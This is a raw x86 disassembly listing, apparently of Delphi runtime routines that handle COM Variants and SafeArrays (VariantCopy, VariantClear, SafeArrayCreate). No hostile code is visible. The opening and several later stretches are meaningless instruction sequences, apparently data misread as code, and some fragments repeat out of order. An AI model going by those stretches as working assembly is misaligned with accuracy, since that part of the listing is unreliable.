lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9d6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404188
retn
insb
dec edi
jo r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
retn
popad
outsb
je r-xdata
add [ eax ] al
enter 0x40e3 0x0
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr al 0x1
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
add [ ebp + 0x2fe8fc45 ] cl
pop eax
jb r-xdata
iretd
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_404164
retn
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
call 0x4ce8ea
call sub_40e866
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
call 0x4ce886
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
sub_40e866
inc eax
jbe r-xdata
je r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
dec esi
jne r-xdata
push 0x6f727245
jb r-xdata
iretd
outsd
jb r-xdata
call 0xffffffff8c2536dd
mov ebx eax
xor eax eax
push ebp
push sub_40e9cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4140bc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4140bc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9d6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404188
retn
insb
dec edi
jo r-xdata
popad
outsb
je r-xdata
rcl al 0xe8
add [ ebp + 0x2fe8fc45 ] cl
pop eax
jb r-xdata
add [ eax + 0x33 ] bl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
retn
popad
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_404164
retn
outsb
add [ eax ] al
enter 0x40e3 0x0
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr al 0x1
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
call 0x4ce8ea
call sub_40e866
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
call 0x4ce886
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
sub_40e8ec
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e936
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40e940
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e9cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4140bc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4140bc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9d6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404188
retn
sub_40e9dc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ea26
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea2d
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40ea30
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ea7a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea81
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40ea84
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40eb13
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4140bc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4140bc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb1a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404188
retn
sub_40eb20
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eb6a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb71
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40eb74
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40edb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40edc0
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_404188
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
dec eax
je r-xdata
call sub_40e8ec
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
jmp r-xdata
call sub_40e9dc
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b334
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
jmp r-xdata
sub_40edd4
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e940
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40ea84
jmp r-xdata
jmp r-xdata
call sub_40eb74
sub_40ee08
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40277c
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
call sub_40277c
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40edd4
pop esi
pop ebx
retn
call sub_40277c
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40edd4
jmp r-xdata
call sub_4027bc
mov edx eax
mov eax edx
call sub_403b1c
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40edd4
jmp r-xdata
pop esi
pop ebx
retn
sub_40ee8c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eed6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eedd
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40eef4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ef24
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ef24
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ef80
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40edc8
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40edc8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40eef4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40edc8
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40edc8
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40ef24
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40edc8
mov eax [ ebp - 0x314 ]
call sub_40f178
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f0fc
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40edc8
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404164
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_41468c
test al al
je r-xdata
mov eax ebx
call sub_40ef80
jmp r-xdata
push ebx
call VariantClear
call sub_40edc8
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f194
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f1c4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f1c4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f220
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40edc8
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40edc8
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f178
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40eb20
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40edc8
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40edc8
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f194
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f1c4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40edc8
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40edc8
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f3f4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f0fc
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40edc8
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4041b8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_41468c
test al al
je r-xdata
mov ecx sub_40f3ec
mov edx esi
mov eax ebx
call sub_40f220
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40edc8
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f4a0
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f3f4
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f0fc
sub_40f4e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f540
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f4a0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f76c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f547
lea eax [ ebp - 0x10 ]
call sub_40f178
retn
sub_40f550
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f58e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412bb8
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413568
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f595
lea eax [ ebp - 0x4 ]
call sub_404844
retn
sub_40f59c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f5da
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412490
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41353c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f5e1
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40f5e8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f626
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_41325c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4135cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f62d
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
sub_40f634
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_403ae4#8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413190
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4135a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f679
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
sub_40f680
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f76c
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40edd4
jmp r-xdata
mov edx esi
call sub_40e940
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40edd4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f700
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_41468c
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f4e4
jmp r-xdata
mov edx esp
mov eax esi
call sub_41468c
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f680
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f76c
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f4a0
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f76c
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f7b1 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f59c
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40eee0
jmp r-xdata
mov eax ebx
call sub_4100d8
mov edx eax
mov eax esi
call sub_4133e4
jmp r-xdata
mov eax ebx
call sub_40fb30
mov edx eax
mov eax esi
call sub_413344
jmp r-xdata
mov eax ebx
call sub_41149c
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_413430
jmp r-xdata
mov eax ebx
call sub_411104
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413454
jmp r-xdata
mov eax ebx
call sub_411ddc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413480
jmp r-xdata
mov eax ebx
call sub_411874
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4134ac
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f550
